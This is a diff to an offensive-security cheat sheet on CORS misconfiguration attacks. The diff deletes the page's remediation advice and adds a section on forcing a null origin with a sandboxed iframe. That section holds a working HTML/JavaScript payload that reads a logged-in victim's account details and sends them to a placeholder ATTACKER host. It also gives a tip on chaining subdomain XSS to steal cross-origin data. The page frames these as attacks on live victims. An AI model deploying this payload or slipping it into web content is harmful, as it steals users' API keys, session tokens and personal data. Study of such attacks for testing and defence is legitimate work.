@@ -41,10 +41,27 @@ fetch('https://target.tld/api/me', {credentials:'include'})
 !!! opsec "Only works with a live victim"
     CORS theft needs the victim authenticated and visiting your page — it's a targeted, phishing-flavored attack, not a mass scan.
 
-## :material-shield-check: Remediation
+## :material-cube-outline: Forcing a `null` origin with a sandboxed iframe
 
-- Never reflect `Origin`; use a strict allowlist. Never combine `*` with credentials.
-- Don't trust `Origin: null`; validate the full origin string.
+When the server trusts `Origin: null` (`Access-Control-Allow-Origin: null` + credentials), a sandboxed iframe generates exactly that origin. Host this on your exploit page — it reads the authenticated response and exfils it:
+
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://$TARGET/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='https://ATTACKER/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
+```
+
+The `log?key=` hit on your server carries the victim's JSON (username, email, apikey, session tokens).
+
+!!! tip "Chain XSS on a trusted subdomain"
+    If CORS trusts a whole sibling domain (e.g. `*.target.tld`) and you find [XSS](xss.md) on any low-value subdomain in that trust boundary, run the credentialed `fetch` from there — the response is same-trust and readable, turning a throwaway reflected XSS into full cross-origin data theft.
 
 ## :material-link-variant: Related
 
